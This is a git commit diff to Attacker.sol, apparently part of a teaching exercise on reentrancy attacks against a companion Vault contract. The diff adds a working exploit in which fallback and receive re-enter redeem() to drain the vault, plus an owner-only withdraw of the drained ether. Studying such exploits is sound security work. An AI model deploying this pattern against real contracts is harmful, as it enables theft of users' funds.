ba9c184f6ef7ee2dc3675aaee502406b8dd637ef
Adrien Launay <adrien.launay@viatelecom.com>
2023-06-15 17:34:59 +0200

    reentrancy exercice with unit testing & tested on remix

--- security/reentrancy-attack/contracts/Attacker.sol
+++ security/reentrancy-attack/contracts/Attacker.sol
@@ -1,10 +1,23 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.20;
 
+import "@openzeppelin/contracts/access/Ownable.sol";
+
 import "./Vault.sol";
+ 
 
-contract Attacker {
+/**
+ * @title A contract to experiment the reentrancy attack
+ * @author Adrien L. <hladrien@gmail.com>
+ * @notice It should be executed in 3 steps:
+ *  1) storing a little bit of ether with store()
+ *  2) starting the attack with a redeem() call
+ *  3) a withdraw of the extracted fund 
+ */
+contract Attacker is Ownable {
+    error WithdrawFailure();
 
+    event ValueStored(uint amount);
     event RedeemCall(uint callCount);
     event FallbackCall(uint callCount, uint value);
   
@@ -12,25 +25,58 @@ contract Attacker {
     uint redeemCallCount;
     uint fallbackCallCount;
  
-
+    /**
+     * @notice Init deployed Vault contract based on the contract address
+     */
     constructor(address _contractAddr) {
-        // 1) Init deployed Vault contract from contract address
         vault = Vault(_contractAddr);
     }
 
     fallback() external payable {
-        emit FallbackCall(++fallbackCallCount, msg.value);
         this.redeem();
+        emit FallbackCall(++fallbackCallCount, msg.value);
     }
- 
-    // 2) Store a little to be able to do a reddem
-    function store() external payable {
+  
+    receive() external payable {
+        this.redeem();
+        emit FallbackCall(++fallbackCallCount, msg.value);
+    }
+  
+    /**
+     * @notice Store ether to Vault contract from this contract
+     */
+    function store() external payable onlyOwner {
         vault.store{value: msg.value}();
+        emit ValueStored(msg.value);
     }
-      
-    // 3) start the real attack with a first redeem call
+       
+    /**
+     * @notice start the real attack with a first redeem call
+     */
     function redeem() external {
         emit RedeemCall(++redeemCallCount);
         vault.redeem();
+    }
+    
+    function getSenderBalance() external view onlyOwner returns (uint) {
+        return address(msg.sender).balance;
+    }
+    
+    function getAttackerBalance() external view onlyOwner returns (uint) {
+        return address(this).balance;
+    }
+
+    function getVaultBalance() external view onlyOwner returns (uint) {
+        return address(vault).balance;
+    }
+
+    /**
+     * @notice withdraw the extracted funds from this contract
+     */
+    function withdraw() external onlyOwner {
+        (bool success,) = msg.sender.call{ value: address(this).balance }("");
+        if (!success) {
+            revert WithdrawFailure();
+        }
     }
 }
